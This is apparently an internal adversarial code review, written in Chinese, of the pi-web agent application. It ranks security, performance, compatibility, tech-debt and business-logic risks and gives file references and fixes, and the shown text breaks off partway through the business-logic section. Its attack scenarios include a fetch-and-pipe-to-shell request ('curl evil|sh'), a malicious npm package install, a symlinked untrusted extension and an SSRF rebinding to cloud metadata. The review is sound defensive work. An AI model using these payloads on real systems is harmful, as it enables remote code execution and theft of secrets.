# pi-web 对抗性故障预测评审（棕地·6 维度地毯扫描）

- 评审视角：遗留系统“故障预测师”，恶意且严谨，不信任任何输入/配置/外部服务。
- 基线：`phase1-2-engineering-security` HEAD + 当前未提交改动（10 修改 + 5 新增）。
- 假设：流量/数据量/并发随时 5~10 倍放大；每个遗留块都藏着未发生的生产事故。
- 范围：`app/api/**`、`lib/**`、`hooks/**`、`components/**` 关键路径。
- 文档性质：**仅风险，无赞扬**。每条附文件:行号、代码片段、攻击/触发剧本、修复策略。

---

## 0. 严重度速查表

| 严重度 | 编号 | 维度     | 问题                                                                       |
| ------ | ---- | -------- | -------------------------------------------------------------------------- |
| 严重   | S1   | 安全     | 全局无身份认证 + 无会话归属校验，文件/会话任意读删                         |
| 严重   | S2   | 安全     | CSRF 在非 production 默认失效，写操作零防护                                |
| 严重   | S3   | 安全     | `mcp-config/test` 用户可控 `command` 任意执行（RCE）                       |
| 严重   | S4   | 安全     | `skills/install` + `mcp-config/env/setup` 触发任意 npm/uvx/docker 安装执行 |
| 严重   | S5   | 安全     | `extensions/install` 符号链接加载不可信 ES module（持久化 RCE）            |
| 严重   | P1   | 性能     | `listAllSessions` 全量枚举 + 每条正则重建两次，无分页                      |
| 严重   | P2   | 性能     | `globalThis.__piListAllPromise` 全局串行屏障，失败连坐 500                 |
| 严重   | P4   | 性能     | `openSessionCached` 单文件全量重读，无大小/行数分页                        |
| 严重   | P5   | 韧性     | `promptRunning` 时空闲计时器无限重排，会话永不回收（句柄泄漏）             |
| 严重   | P6   | 韧性     | 全局并发活动会话数无上限，雪崩                                             |
| 严重   | C1   | 棕地     | `optimize` 抽凭证后错误状态码 400→500（契约退化）                          |
| 一般   | S6   | 安全     | SSRF 探测 DNS 重绑定时间窗                                                 |
| 一般   | S7   | 安全     | 明文 API Key 落盘（无 0600 / 无加密）                                      |
| 一般   | S8   | 安全     | 会话删除按目录枚举重写任意 `.jsonl` 头                                     |
| 一般   | S9   | 安全     | 前端 `rehype-raw`+katex+mermaid SVG 注入面                                 |
| 一般   | S10  | 安全     | `safeJsonBody` 仅信 `content-length`，分块传输绕过限流（DoS）              |
| 一般   | P3   | 性能     | 会话缓存 LRU 无 TTL / 无字节上限                                           |
| 一般   | P7   | 韧性     | SSE 重连 + 每 15s 对账读放大                                               |
| 一般   | P8   | 韧性     | `AgentRuntimeStore.update` 每次全字段 `JSON.stringify` 深比较              |
| 一般   | P9   | 韧性     | 编排器注册表无上限、`messages` 数组无限增长                                |
| 一般   | P10  | 性能     | 上下文 `formatCompactTranscript` 每轮全量拼接，无窗口保护                  |
| 一般   | P11  | 韧性     | `get_state` 5s 超时不含 `openSessionCached` 同步解析                       |
| 一般   | P12  | 韧性     | 引擎 `publish()` 每个终端 chunk 全量重建状态广播                           |
| 一般   | A1   | 棕地     | `@deprecated` `getSessionEntries` 仍被活代码读取（无割裂，需清理）         |
| 一般   | A3   | 棕地     | `enhance` 改用 `buildEnhanceSystemPromptSelected` 改变输出契约，无回退开关 |
| 一般   | B1   | 技术债   | `prompt-modules-state` 与 `plugin-master-switch` 范式重复                  |
| 一般   | B2   | 技术债   | `enhance` 路由死导入 `buildEnhanceSystemPrompt`                            |
| 一般   | B3   | 技术债   | `optimize` 路由 `import` 置于执行语句之后（`import/first`）                |
| 一般   | C2   | 功能边界 | `PUT /api/prompts/modules` 的 `compressedOverride:""` 静默清空模块文本     |
| 一般   | C3   | 功能边界 | `completeSimple` 调用依赖 `timeoutMs`，无独立 AbortSignal 兜底             |
| 建议   | A2   | 棕地     | `app/api/prompts/*` 确认纯新增，无多版本并存（通过）                       |

---

## 1. 安全漏洞（STRIDE + 注入 + 越权 + 反序列化）

### S1 [严重] 全局无身份认证 + 无会话归属校验

- 文件：`app/api/files/[...path]/route.ts:287`、`app/api/sessions/[id]/route.ts:115`；根因：无 `middleware.ts`。
- 代码：`const sessionId = request.nextUrl.searchParams.get("sessionId"); // 仅做 getAllowedFileRoots() 路径白名单，无 req 身份/归属校验`
- 攻击剧本：本应用是“本地代码执行代理 + Web UI”同进程。端口一旦暴露（局域网/0.0.0.0/`--host`），任何未认证请求即可 `GET /api/files/...` 枚举读取 cwd 下所有文件（`.env`、SSH key、源码），`GET /api/sessions/[id]` 读任意会话，`DELETE /api/sessions/[id]` 删会话。文件接口只按“路径白名单”授权，不校验“是谁的会话”。
- 修复策略：引入进程级本地 token（首次启动生成写入 `~/.pi-web`），`middleware.ts` 统一校验所有 `app/api/**`；`files`/`sessions` 按 `sessionId`/cwd 归属二次校验；默认绑定 `127.0.0.1`，`--host` 显式开启时强制 token。

### S2 [严重] CSRF 在 dev/非 production 默认失效

- 文件：`lib/csrf.ts:42`。
- 代码：`if (process.env.NODE_ENV !== "production") return null; // validateCsrf 永远跳过`
- 攻击剧本：开发/演示部署 `NODE_ENV !== production` 恒成立，`validateCsrf` 恒返回 null。借受害者浏览器可发 `POST /api/auth/api-key/openai {apiKey:"sk-..."}`、`POST /api/extensions/install {path:"/tmp/evil"}`、`POST /api/mcp-config/env/setup` 等，全部写操作零 CSRF 保护。叠加 S1 即远程写。
- 修复策略：开发与生产统一启用校验；或对 `api-key`/`extensions/install`/`mcp-config/env/setup` 等高危写强制校验；用显式开关 `PI_WEB_DISABLE_CSRF=0`（默认开启校验）而非默认跳过。

### S3 [严重] `mcp-config/test` 用户可控 `command` 任意执行（RCE）

- 文件：`app/api/mcp-config/test/route.ts:53-83`（核心 `:61`）。
- 代码：`const child = execFile(command, childArgs, { timeout: PROBE_TIMEOUT_MS, ... }); // command 直接来自请求体，仅追加 --version`
- 攻击剧本：`POST /api/mcp-config/test {transport:"stdio", command:"bash", args:["-c","curl evil|sh"]}`。`command` 是完全由用户控制的二进制路径，任意可执行文件均被启动（SSJI）。`execFile` 无 shell，但被调用的二进制自身即可危害（恶意 ELF、`/usr/bin/env`）。
- 修复策略：`command` 走绝对路径白名单 + 仅允许 `$PATH` 已知安全二进制（`npx/node/python3/uvx/...`）；拒绝绝对路径与含 shell 元字符；最小权限 + 隔离 cwd 执行。

### S4 [严重] `skills/install` + `mcp-config/env/setup` 触发任意包安装执行

- 文件：`app/api/skills/install/route.ts:26-34`、`lib/npx.ts:52-62`、`lib/mcp-env.ts:292`（及 `:173-188,330,349`）。
- 代码：`await runNpx(["skills","add",pkg.trim(),"-y","--agent","pi"], {timeout:60000});` / `await run("npm",["install","--no-save","--prefix",tmp,packageName],{timeout:120_000});`
- 攻击剧本：`POST /api/skills/install {package:"@evil/skills", scope:"global"}` 触发 `npx skills add @evil/skills -y -g`，其 postinstall 即任意代码执行。`mcp-config/env/setup` 经 `provisionCapability`→`installPackage`/`runInitSteps` 执行 `npm install <packageName>`、`uvx <pkg>`、`docker pull <image>`、`npx -y ... init`，其中 `packageName`/`image` 来自用户提交的 `env.command`/`env.args`，无白名单。
- 修复策略：`package` 与 `env.command`/`env.args` 加 registry 作用域白名单（仅官方 npm/`skills.sh` 或显式允许列表）；安装加 `--ignore-scripts`；`env/setup` 仅允许受信能力 ID，禁止自由 command。

### S5 [严重] `extensions/install` 符号链接加载不可信 ES module（持久化 RCE + JS 注入）

- 文件：`app/api/extensions/install/route.ts:19`、`lib/extensions/discovery.ts:248-279`、`app/api/extensions/[extensionId]/[...asset]/route.ts:34`。
- 代码：`const result = installLocalExtension(sourcePath); // symlinkSync(sourcePath, targetDir)` → 资产路由以 `application/javascript` 返回并浏览器执行。
- 攻击剧本：`POST /api/extensions/install {path:"/attacker/owned/ext"}` 创建 `~/.pi-web/extensions/<id>` 指向攻击者目录的符号链接。之后资产路由以 `application/javascript` 返回并浏览器执行该不可信模块（任意 JS：内网 `fetch`、窃 token）。`isSafeRelativePath` 只校验扩展自身 `module` 字段，不限制 `sourcePath`，symlink 目标完全可控。
- 修复策略：`path` 必须落在受信根（项目内 `extensions/` 或显式审批目录），拒绝任意绝对路径与符号链接跟随；加载前做来源/完整性校验；资产服务加 `Content-Security-Policy` 与 `X-Content-Type-Options: nosniff`。

### S6 [一般] SSRF 探测 DNS 重绑定时间窗

- 文件：`lib/net-private.ts:63-75`、`app/api/mcp-config/test/route.ts:107`。
- 代码：`resolve(hostname)` 后 `isPrivateIp` 校验，但 `fetch(probeUrl)` 实际连接前存在 DNS 重绑时间窗。
- 攻击剧本：攻击者域名先解析公网 IP 通过校验，`fetch` 发生时已重绑到 `169.254.169.254`（云元数据），泄露内网端口存活，成为内网侦察跳板。
- 修复策略：解析结果与连接绑定（固定 IP，`connect` 级 pinning，禁用再解析）；对响应头/body 限长。

### S7 [一般] 明文 API Key 落盘

- 文件：`app/api/auth/api-key/[provider]/route.ts:48`、`app/api/models-config/route.ts:31`。
- 代码：`authStorage.set(provider, { type:"api_key", key: apiKey.trim() });` / `writeFileSync(path, JSON.stringify(data), "utf8");`
- 攻击剧本：叠加 S1，`GET /api/files/.../models.json` 或读 `AuthStorage` 文件即得明文 key；磁盘无 0600、无加密。
- 修复策略：落盘 0600；优先系统密钥链；读盘路径把密钥文件排除出文件接口白名单。

### S8 [一般] 会话删除按目录枚举重写任意 `.jsonl` 头

- 文件：`app/api/sessions/[id]/route.ts:247-275`。
- 代码：对 `dir` 内 `*.jsonl` 且 header `parentSession===filePath` 的文件整文件重写 `reparentSessionHeader`。
- 攻击剧本：结合 S1 写接口/符号链接，可触发对任意 jsonl 的内容重写（仅 header 行，但属未授权写）。
- 修复策略：重写前校验目标文件属当前用户会话域；配合 S1 统一认证。

### S9 [一般] 前端渲染 `rehype-raw`+katex+mermaid SVG 注入面

- 文件：`lib/markdown.ts:8-29`、`components/MarkdownBody.tsx:144-222`。
- 代码：`[rehypeRaw, [rehypeSanitize, schema], [rehypeKatex,...]]`；`MermaidBlock: dangerouslySetInnerHTML={{ __html: svg }}`。
- 攻击剧本：会话内容含构造的 HTML/math/mermaid，经 `rehype-raw` 进入 DOM；mermaid `securityLevel:"strict"` 缓解但仍依赖版本 `^11.14.0` 无已知绕过；katex `strict:false` 有历史 CVE 面。
- 修复策略：渲染统一置于沙箱 iframe（`sandbox`）或 CSP `script-src 'none'` 容器；mermaid 结果隔离 Shadow DOM/iframe；锁定 katex/mermaid 至已修补版本并订阅 CVE。

### S10 [一般] `safeJsonBody` 仅信 `content-length`，分块传输绕过限流（DoS）

- 文件：`lib/api-utils.ts:30-39`。
- 代码：`const contentLength = Number(req.headers.get("content-length") ?? "0"); if (contentLength > maxBytes) return ...413; const body = await req.json();`
- 攻击剧本：缺 `content-length` 或用 `Transfer-Encoding: chunked` 时头为空，直接 `req.json()` 解析，大 JSON 可耗尽内存（大 JSON DoS）。
- 修复策略：边读边限流（按实际字节截断），不信任 `content-length`；`req.json()` 用带上限流式读取。

<!-- PART1_END -->

---

## 2. 性能瓶颈（5~10 倍流量/数据假设）

### P1 [严重] `listAllSessions` 全量枚举 + 每条正则重建两次，无分页

- 文件：`lib/session-reader.ts:12-68`（构造 `SessionInfo`）；`lib/session-reader.ts:50-57`（逐条 `new RegExp(/^orchestrator:([\w-]+)$/)` 重建两次）。
- 代码：`for (const s of sessionManager.listAll()) { infos.push(buildInfo(s)); }`；`buildSessionContext` 内对每一条 entry 重编译两个正则。
- 触发剧本：会话数 ×10 时，每个列表请求都遍历所有 project root 的全部 `.jsonl`、`openSessionCached` 至少一次；单请求 CPU 与 I/O 随会话总量线性放大，无 `limit/offset` 分页，前端一次性拉全量。
- 修复策略：列表接口加 `?cursor=&limit=`，server 端增量返回；正则提升为模块级常量（只编译一次）；`buildSessionContext` 按需取叶子回溯，避免双遍历。

### P2 [严重] `globalThis.__piListAllPromise` 全局串行屏障 + 失败连坐

- 文件：`lib/session-reader.ts`（全局去重缓存）。
- 代码：`globalThis.__piListAllPromise = globalThis.__piListAllPromise || doListAll();` 并发请求共享同一 Promise。
- 触发剧本：若 `doListAll()` reject（权限/磁盘错误），所有并发请求同时拿到该 rejection → 批量 500；且该缓存直到下一 tick 才清空，故障窗口期内列表接口全红。单缓存即全局串行点，10× 并发下彼此阻塞。
- 修复策略：请求级去重 + 失败即清缓存；加超时与熔断；列表读取与单会话读取解耦，避免单点拖垮全站。

### P3 [一般] 会话缓存 LRU 无 TTL / 无字节上限

- 文件：`lib/session-reader.ts:98`（`@deprecated __piSessionEntriesCache`）、数据缓存（`__piSessionDataCache`）。
- 代码：路径缓存有 60s TTL，但数据缓存无 TTL、无 max bytes；大 jsonl 解析结果常驻内存。
- 触发剧本：10× 会话规模下，常驻解析结果累积，老会话数据长期不淘汰 → 内存只增不减，最终 OOM 触发进程重启、所有 SSE 断流。
- 修复策略：数据缓存加 LRU（max entries）+ 软 TTL + 单条目字节上限；超过上限的会话走按需重读。

### P4 [严重] `openSessionCached` 单文件全量重读，无大小/行数分页

- 文件：`lib/session-reader.ts:148-173`。
- 代码：`const content = await readFile(filePath, "utf8"); const lines = content.split("\n"); /* 解析全部，仅展示 200 上限 */`
- 触发剧本：超大 `.jsonl`（映射到“千万行级会话”）每次读取都 `readFile` 整文件 + 全量 `JSON.parse` 每行，仅取尾 200 行；单请求即可打满事件循环，并发下雪崩。
- 修复策略：大文件走尾部读取（seek 末 N 字节 / 流式分块）、按行号范围分页；解析与展示解耦；加单文件大小硬上限（超限返回截断提示）。

### P5 [严重] `promptRunning` 时空闲计时器无限重排，会话永不回收（句柄泄漏）

- 文件：`lib/rpc-manager.ts:300-318`（空闲 10 分钟 `destroy`）；随 `promptRunning` 重置。
- 代码：`if (this.promptRunning) { /* markActivity 持续重置 destroyTimer */ }`，使计时器在长任务期间反复取消再排。
- 触发剧本：多个常驻“运行中”会话（agent 长任务、轮询）使 idle timer 永不触发 → `AgentSession` 实例、文件句柄、订阅永久存活；10× 并发长任务 → 内存/句柄泄漏直至进程崩溃。
- 修复策略：空闲回收改“绝对上限 + 活跃度双阈值”（如硬上限 4h 强制 destroy，不论 promptRunning）；分离“运行态心跳”与“空闲回收”两条计时线。

### P6 [严重] 全局并发活动会话数无上限

- 文件：`lib/rpc-manager.ts:1043-1144`（`startRpcSession` 仅按 id 去重）。
- 代码：仅 `globalThis.__piStartLocks[id]` 防同 id 重入，无全局并发配额。
- 触发剧本：攻击者可枚举不同 `id` 并发 `startRpcSession` → N 个完整 `AgentSession` 常驻，内存/CPU/外部 LLM 配额被打满，造成资源耗尽型 DoS。
- 修复策略：全局信号量限制并发活跃会话（如 `MAX_ACTIVE_SESSIONS=32`），超限返回 `429`；按 cwd/用户配额隔离。

### P7 [一般] SSE 重连 + 每 15s 对账读放大

- 文件：`hooks/useAgentSession.ts`（SSE 5s 超时重连 + `visibilitychange`/`online` + 每 15s `GET /api/agent/[id]`）。
- 代码：多标签页各自独立 SSE + 定时对账，每次对账都触发一次 `buildSessionContext` 全量回溯。
- 触发剧本：用户开 10 个标签页 ×10× 用户 → 对账请求量 = 会话数 ×(标签页数) ×(4/min)；叠加 P1/P4 全量解析，读放大指数级。
- 修复策略：对账改为条件触发（仅本地有未确认变更时）；SSE 服务端合并多客户端；引入 ETag/`If-None-Match` 跳过无变化会话。

### P8 [一般] `AgentRuntimeStore.update` 每次全字段 `JSON.stringify` 深比较

- 文件：`lib/agent-runtime-store.ts:54-71`。
- 代码：`const serialized = JSON.stringify(newState); if (serialized === last) return; last = serialized; subscribers.forEach(fn => fn(newState));`
- 触发剧本：运行时状态高频更新（token 流、工具事件）时，每次 `update` 全量序列化 + 全订阅者同步推送；10× 事件频率下主线程被序列化与广播占满。
- 修复策略：细粒度字段 diff（仅变更字段广播）；序列化移出热路径（worker/节流）；订阅者按字段分区。

### P9 [一般] 编排器注册表无上限、`messages` 数组无限增长

- 文件：`lib/agent-orchestrator/orchestrator.ts`（角色注册表、`messages` 累积）。
- 代码：每轮讨论向各角色 `messages` push，无截断；注册表随插件增长无界。
- 触发剧本：多轮长讨论 → 单角色消息数组膨胀至 O(轮数×角色)，`completeSimple` 上下文线性增长，token 成本与延迟失控。
- 修复策略：`messages` 加滑动窗口/摘要压缩；注册表加容量监控与淘汰。

### P10 [一般] 上下文 `formatCompactTranscript` 每轮全量拼接，无窗口保护

- 文件：`lib/agent-runtime-store.ts` / 上下文拼装路径（`formatCompactTranscript`）。
- 代码：每轮重新拼接完整 transcript 字符串。
- 触发剧本：大上下文下每轮 O(n) 字符串复制，n 轮累计 O(n²) 时间/内存；10× 会话长度时显著劣化。
- 修复策略：增量追加 + 跨轮复用缓冲；超长截断到窗口（保留首尾）。

### P11 [一般] `get_state` 5s 超时不含同步解析

- 文件：`lib/rpc-manager.ts`（get_state 通道，`timeoutMs:5000`）。
- 代码：超时只罩 RPC 调用，不罩 `openSessionCached` 的同步整文件解析（见 P4）。
- 触发剧本：超大 jsonl 的同步解析耗时 >5s 时，超时无效，事件循环被阻塞，SSE 卡死。
- 修复策略：解析移到异步流式（见 P4），`get_state` 超时覆盖从读取到返回的全链路。

### P12 [一般] 引擎 `publish()` 每个终端 chunk 全量重建状态广播

- 文件：`lib/unified-engine/*.ts`（`publish` / 状态广播）。
- 代码：每次终端输出 chunk 触发一次全量 `UnifiedEngineState` 重建 + 广播。
- 触发剧本：长任务的密集终端流（每秒数十 chunk）下，状态重建/广播成为瓶颈，挤占 agent 运行资源。
- 修复策略：终端流批量合并（如 100ms 节流）、状态广播与数据流分离。

<!-- PART2_END -->

---

## 3. 棕地兼容性（多版本 API / 废弃字段未清理）

### A1 [一般] `@deprecated` `getSessionEntries` 仍被活代码读取

- 文件：`lib/session-reader.ts`（`@deprecated getSessionEntries`、`__piSessionEntriesCache`）；调用方 `lib/session-file-references.ts:13`、`lib/task-entry-resolver.ts`。
- 代码：`export async function getSessionEntries(filePath) { return (await openSessionCached(filePath)).entries; } // 仅转发至新缓存`
- 触发剧本：旧 API 未清理，新缓存与废弃别名长期并存；虽当前 `getSessionEntries` 仅转发、无数据割裂，但双入口增加重构回归面，且 `@deprecated` 标注形同虚设。
- 修复策略（绞杀者）：调用点就地替换为 `openSessionCached(filePath).entries`，保留别名一个发布周期后删除；加 `// TODO(remove)` 与单测断言等价性。

### A2 [建议] `app/api/prompts/*` 纯新增，无多版本并存

- 文件：`app/api/prompts/{compress,modules,preview-select}`（全新增）。
- 代码：`git diff --name-status app/api` 无 `D` 删除；既有 `agent/enhance`、`agents-md/optimize` 路径不变。
- 触发剧本：N/A（向后兼容通过项，归档不省略）。
- 修复策略：无需修改；上线后保留旧端点至少两个发布周期再评估弃用。

### A3 [一般] `enhance` 改用 `buildEnhanceSystemPromptSelected` 改变输出契约，无回退开关

- 文件：`app/api/agent/enhance/route.ts:163-165`、`lib/prompt-system/enhance-modules.ts:84-92`。
- 代码：`const systemPrompt = buildEnhanceSystemPromptSelected(prompt, projectContext); // 动态裁剪可选模块（如 grounding）`
- 触发剧本：中文 prompt 不含 `project`/`context`/`grounding` 子串时，`enhance.grounding` 被跳过，增强输出文本与上一版本不同；依赖确定性输出的调用方（快照回归、缓存命中）静默失效。
- 修复策略（特性开关）：新增 `ENHANCE_DYNAMIC_SELECT`（默认 **OFF** 保兼容），OFF 走旧 `buildEnhanceSystemPrompt(projectContext)` 逐字一致；灰度验证后再默认开启。

---

## 4. 技术债务（复制粘贴 / 死代码 / 重复状态）

### B1 [一般] `prompt-modules-state` 与 `plugin-master-switch` 范式重复

- 文件：`lib/prompt-modules-state.ts`、`lib/plugin-master-switch.ts`。
- 代码：两者同为 `globalThis` 缓存 + `defaultState()` + 原子写（`tmp+rename`）+ `read*/write*` 对称 API，结构高度一致，仅字段不同。
- 触发剧本：两处开关语义相同但实现分叉，后续任一侧加“迁移/回滚/默认值演进”逻辑需双份维护，易漂移（一边修一边漏）。
- 修复策略（绞杀者）：抽公共 `createSidecarState<T>(fileName, defaultState)` 工厂，两模块复用；旧实现保留一个发布周期后替换调用点。

### B2 [一般] `enhance` 路由死导入 `buildEnhanceSystemPrompt`

- 文件：`app/api/agent/enhance/route.ts`（import 列表）。
- 代码：`import { buildEnhanceSystemPrompt, buildEnhanceSystemPromptSelected, buildEnhanceUserMessage, stripToolCallArtifacts }` —— `buildEnhanceSystemPrompt` 已不再调用。
- 触发剧本：静态分析/lint 告警；无运行时影响，但混淆“哪个符号是真实入口”。
- 修复策略：从 import 列表删除 `buildEnhanceSystemPrompt`（保留其余三个）；`npm run lint` 验证无 unused。

### B3 [一般] `optimize` 路由 `import` 置于执行语句之后

- 文件：`app/api/agents-md/optimize/route.ts:6-8`。
- 代码：`const { completeSimple } = getPiAdapter();` 之后才 `import { resolveDefaultModelCredentials } from "@/lib/pi-model-creds";`
- 触发剧本：ESM 下 import 会被提升故运行无误，但违反 `import/first`，lint 报错、可读性差，且易在 tree-shaking/严格打包下引入隐患。
- 修复策略：将 import 统一移至文件顶部；`npm run lint` 验证。

---

## 5. 功能边界（输入校验 / 边界条件 / 错误处理）

### C1 [严重] `optimize` 抽凭证后错误状态码 400→500（契约退化）

- 文件：`app/api/agents-md/optimize/route.ts:85`、`lib/pi-model-creds.ts`、`lib/api-utils.ts:6-13`。
- 代码：`} catch (error) { return errorResponse(error); }` 而 `errorResponse(error, status=500)`；原三处显式 `errorResponse("...", 400)` 现由 `resolveDefaultModelCredentials` 抛错吞没。
- 触发剧本：`POST /api/agents-md/optimize` 且未配置默认模型 / 模型不存在 / 无 API Key 时，原返回 `400` + 具体消息，现返回 `500`、且生产环境消息被掩盖为 "Internal server error"。依赖 `4xx`/`5xx` 区分配置错误的调用方误判；生产可诊断性丧失。
- 修复策略（最小侵入）：在 `lib/pi-model-creds.ts` 引入 `class ModelCredentialsError extends Error { status=400 }`，三处 `throw new ModelCredentialsError(msg)`；optimize `catch` 增加 `if (error instanceof ModelCredentialsError) return errorResponse(error.message, error.status);`。不改变 `resolveDefaultModelCredentials` 其他调用约定。

### C2 [一般] `PUT /api/prompts/modules` 的 `compressedOverride:""` 静默清空模块文本

- 文件：`app/api/prompts/modules/route.ts:43-51`。
- 代码：`if ("compressedOverride" in body) setCompressedOverride(id, body.compressedOverride ?? undefined);` —— 传 `""` 经 `??` 不触发 undefined，于是写入空字符串覆盖原压缩文本。
- 触发剧本：UI 清空输入框提交 `compressedOverride:""` 会令该模块 `compressedText` 变为空，渲染层可能回退到未压缩大文本，造成不可预期的 token 暴涨（与“压缩”目标相反）。
- 修复策略：空串按“清除覆盖”语义处理：`setCompressedOverride(id, body.compressedOverride || undefined)`（空串/undefined 均清除）；或后端拒绝空串并 400。

### C3 [一般] `completeSimple` 调用依赖 `timeoutMs`，无独立 AbortSignal 兜底

- 文件：`app/api/agents-md/optimize/route.ts`（options `timeoutMs: TIMEOUT_MS`）、`app/api/agent/enhance/route.ts`。
- 代码：`completeSimple(model as ..., {messages}, {apiKey, headers, maxTokens:8192, timeoutMs:60000, maxRetries:0, cacheRetention:"none", systemPrompt})` —— 超时完全交给被调方实现。
- 触发剧本：若底层实现忽略 `timeoutMs` 或 hang（网络分区、提供方假死），请求线程被无限占用，叠加 P6 无并发上限 → 资源耗尽。
- 修复策略：调用方自建 `AbortController` + `Promise.race` 硬超时；超时即 `controller.abort()` 并回收；超时返回 `504` 而非挂起。

---

## 6. 修复路线图（按优先级，最小侵入 / 绞杀者 / 特性开关）

**P0 — 发布前必修（安全 + 棕地契约）**

1. S3：为 `mcp-config/test` 的 `command` 加绝对路径白名单（仅 `$PATH` 已知安全二进制），拒绝绝对路径与 shell 元字符。1 文件、约 20 行。
2. S4：为 `skills/install` 的 `package`、`mcp-config/env/setup` 的 `command/args` 加 registry 作用域白名单 + `--ignore-scripts`。2~3 文件。
3. S5：限制 `extensions/install` 的 `path` 至受信根、禁止符号链接跟随、资产响应加 CSP。2 文件。
4. S2：将 CSRF 改为默认开启（显式 `PI_WEB_DISABLE_CSRF=0` 才关），覆盖高危写接口。
5. C1：引入 `ModelCredentialsError`，恢复 optimize 路由 `400` 语义。半文件改动。
6. S1（若端口可能暴露）：补 `middleware.ts` 进程级 token 校验 + 默认 `127.0.0.1`。

**P1 — 弹性加固（性能/韧性，防 5~10× 雪崩）** 7. P4+P11：`openSessionCached` 改尾部流式读取 + 文件大小硬上限；解析移出同步热路径。8. P5+P6：`rpc-manager` 加“硬上限强制回收”+ 全局并发信号量 `MAX_ACTIVE_SESSIONS`，超限 `429`。9. P2：列表去重缓存失败即清 + 熔断；列表接口加分页。10. P1：正则提升模块级常量；列表分页。P3：缓存加 LRU+TTL+字节上限。

**P2 — 债务清理（绞杀者，非阻塞）** 11. A3：加 `ENHANCE_DYNAMIC_SELECT` 开关（默认 OFF 保兼容）。12. B1：抽 `createSidecarState` 工厂复用两套开关状态；B2/B3：删死导入、修 import 顺序。13. A1：内联 `getSessionEntries` 调用点后删除别名。C2：空串按清除语义处理。C3：调用方自建 AbortController 硬超时。

**P3 — 监控断言（验证落地）**

- `mcp-config/test` 非白名单 `command` 请求率应为 0；`skills/install` 非白名单 `package` 拒绝率。
- `optimize` 端点 `5xx` 率不因配置缺失上升（C1 验证）。
- `listAllSessions` P99 延迟与 `openSessionCached` 最大文件字节数设告警阈值。
- 活动 `AgentSession` 并发数持续 < `MAX_ACTIVE_SESSIONS`；idle 回收数 > 0（P5/P6 验证）。
- `enhance` 开关 OFF 时输出与 `buildEnhanceSystemPrompt(projectContext)` 逐字一致（A3 快照）。

<!-- PART3_END -->

---

## 7. 业务逻辑合理性（故障预测师·业务逻辑破坏者模式）

视角切换：不仅关注崩溃，更关注**功能是否合理、是否在解决正确的问题、需求是否被误读**。新增编号 `L*`（Logic）与既有 S/P/C/A/B 不重叠；与安全同源自 S1/S5 的项在此强调**业务后果**。

### 7.0 速查表

| 编号 | 子域       | 严重度 | 业务问题                                                           |
| ---- | ---------- | ------ | ------------------------------------------------------------------ |
| L1   | 需求一致性 | 严重   | 引擎 Run 已终态(completed/failed)可被 resume 重跑（已退款重发货）  |
| L2   | 需求一致性 | 严重   | 插件总闸关闭后单包 disable 仍可翻转，snapshot 恢复语义破坏         |
| L3   | 需求一致性 | 严重   | 会话 DELETE 级联 re-parent 用绝对路径做外键，跨重命名失效/误挂     |
| L4   | 需求一致性 | 一般   | set_tools 全关再开部分工具，forceEmptySystemPrompt 未对齐          |
| L5   | 需求一致性 | 一般   | optimize 依赖校验晚于 LLM 调用，无凭证时模糊 500                   |
| L6   | 需求一致性 | 建议   | /api/todos 恒空、/api/task-list 才是真源，空壳死接口               |
| L7   | 缺失场景   | 严重   | SSE 断开/关页后服务端 Agent 仍跑烧 token（无断开即 abort）         |
| L8   | 缺失场景   | 严重   | 重复点击发送不幂等，同 prompt 双发 LLM                             |
| L9   | 缺失场景   | 严重   | fork 在 running 中直接 destroy，丢失进行中 run                     |
| L10  | 缺失场景   | 严重   | 会话 DELETE 无归属校验，可直接调 API 删任意会话（批量将放大）      |
| L11  | 缺失场景   | 高     | 批量启用 prompt 模块无事务，部分成功状态分裂                       |
| L12  | 缺失场景   | 中     | MCP 整文件覆盖 PUT，并发/不完整提交丢失 server 配置                |
| L13  | 缺失场景   | 中     | extension install 失败不回滚 symlink，sourcePath 未白名单          |
| L14  | 缺失场景   | 中     | optimize 超时(60s)后无原 content 补偿，前端内容可能丢失            |
| L15  | 冗余设计   | 中     | select-llm LLM 精排生产永不触发（useLlmSelect 默认 false），死代码 |
| L16  | 冗余设计   | 中     | vendor/memory 双 autoplan 适配生产永不触达，死代码                 |
| L17  | 冗余设计   | 低中   | ENGINE_REAL_VERIFY 反向语义（非0即开），认知负载                   |
| L18  | 冗余设计   | 低     | pruneStaleSessions 死函数未调用                                    |
| L19  | 冗余设计   | 低     | registerAutoPlanAdapter 测试专用未生产用，多余接缝                 |
| L20  | 棕地数据   | 中     | 未知 entry.type 静默丢弃，历史自定义类型误分类、UI 缺口            |
| L21  | 棕地数据   | 中     | 历史 provider/model 旧名/空串未归一，token 统计失真                |
| L22  | 棕地数据   | 低中   | master snapshot 异常路径清空，历史禁用态不可逆丢失                 |
| L23  | 需求一致性 | 一般   | pause 仅协同式检查，长任务阶段内 pause 无效（暂停失灵）            |

---

### 7.1 需求一致性检查（状态机 / 权限 / 自相矛盾校验）

#### L1 [严重] 引擎 Run 已终态可被 resume 重跑——“已退款订单重新发货”

- 文件：`app/api/engine/runs/route.ts:26,30`、`lib/unified-engine/unified-engine-runtime.ts:227-258`、`lib/autoplan-loop-service.ts:118-124`。
- 代码：`startRun`/`resumeRun` 仅对 `running` 幂等（`if (run.status==="running" && runningIds.has(id)) return run;`），对 `completed`/`failed` 直接 `run.status="running"; void this.runLoop(run);`；`runLifecycle` 仅在 `stage==="archive"` 收尾。
- 违反原则：状态机缺少“终止态不可重入”约束。
- 业务后果：**资损**（重复消耗 LLM/Tool 与 token）；失败 run 被误 resume 可能覆盖已有产物、产生冲突；**审计风险**（运行历史不可信）。
- 修复（最小+兼容）：`startRun`/`resumeRun` 增加 `if (status==="completed"||status==="failed") return 拒绝(409)`；提供独立 `restart`（新建 Run 或重置 task 状态）而非复用 resume；旧 `failed` 历史数据保持可读、不被静默重跑。

#### L2 [严重] 插件总闸关闭后单包 disable 仍可翻转，snapshot 恢复语义破坏

- 文件：`app/api/plugins/master/route.ts:57-69`（关总闸写 `state.snapshot`）、`app/api/plugins/route.ts:277-284`（`disable/enable` 任意时刻可调用、不读 `masterSwitch.enabled`）。
- 代码：两层控制面共用同一份 `settings.json` 资源数组，单包接口未对总闸状态做 guard。
- 违反原则：全局总开关与单包开关应互斥或级联，不能各自为政。
- 业务后果：**状态漂移**——关总闸后调 `enable` 点亮某包；再开总闸按 `snapshot`（记录为 disabled）覆盖写回，吞掉用户“单包启用”意图；反之关闸期间 disable 某包，snapshot 不更新，开闸时被错误恢复为启用。
